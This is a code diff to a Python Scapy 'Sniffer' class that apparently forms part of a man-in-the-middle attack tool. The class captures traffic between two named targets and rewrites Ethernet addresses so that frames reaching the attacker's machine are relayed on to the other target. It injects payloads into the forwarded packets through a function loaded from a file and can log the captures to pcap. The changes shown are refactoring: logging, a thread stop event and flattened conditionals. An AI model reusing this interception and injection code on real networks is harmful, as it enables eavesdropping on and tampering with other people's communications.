@@ -1,8 +1,11 @@
-import scapy.all as scapy
 import datetime
 import os
 from importlib import import_module
 import sys
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+import scapy.all as scapy
+
 
 class Sniffer:
 
@@ -45,23 +48,26 @@ class Sniffer:
         else:
             return predefined_options
 
-    def sniff_packets(self):
+    def sniff_packets(self, event=None):
         capture_filter = "(host " + self.target_1["IP"] + \
                          " or host " + self.target_2["IP"] + ")"
-        scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))
+        if event is None:  # This is the case when Sniffer is used as a Standalone Class
+            scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))
+        else:  # This is the case when Sniffer is run as a Thread from main.py
+            scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x),
+                        stop_filter=lambda p: event.isSet())
+        sys.exit(0)
 
     def forward_packets(self, scapy_packet):
         if self.write_to_pcap["wr"] is True:
             scapy.wrpcap(self.write_to_pcap["arg"], scapy_packet, append=True)
 
-        if "IP" in scapy_packet:
-            if scapy_packet["IP"].dst != self.attacker["IP"] and scapy_packet["Ethernet"].dst == self.attacker["MAC"]:
-                scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else \
-                self.target_2["MAC"]
-                scapy_packet["Ethernet"].src = self.attacker["MAC"]
+        if "IP" in scapy_packet and scapy_packet["IP"].dst != self.attacker["IP"] and scapy_packet["Ethernet"].dst == self.attacker["MAC"]:
+            scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else self.target_2["MAC"]
+            scapy_packet["Ethernet"].src = self.attacker["MAC"]
 
-                pkt = self.insert_payload(scapy_packet)
-                scapy.sendp(pkt, verbose=False, iface=self.iface)
+            pkt = self.insert_payload(scapy_packet)
+            scapy.sendp(pkt, verbose=False, iface=self.iface)
 
     def insert_payload(self, scapy_packet):
         if self.payload_option["option"] == "1":
@@ -69,8 +75,8 @@ class Sniffer:
             return scapy_packet
         elif self.payload_option["option"] == "2":
             # self.payload_option["arg"] here is the function "pkt_payload" that receives (self, scapy_packet) as argument and
-            # was read from a file in read_payload_options() option n°2
-            return self.payload_option["arg"](self, scapy_packet)
+            # was read from a file in read_payload_options(), option n°2
+            return self.payload_option["arg"](scapy_packet)
 
     def get_iface(self):
         route = scapy.Route()
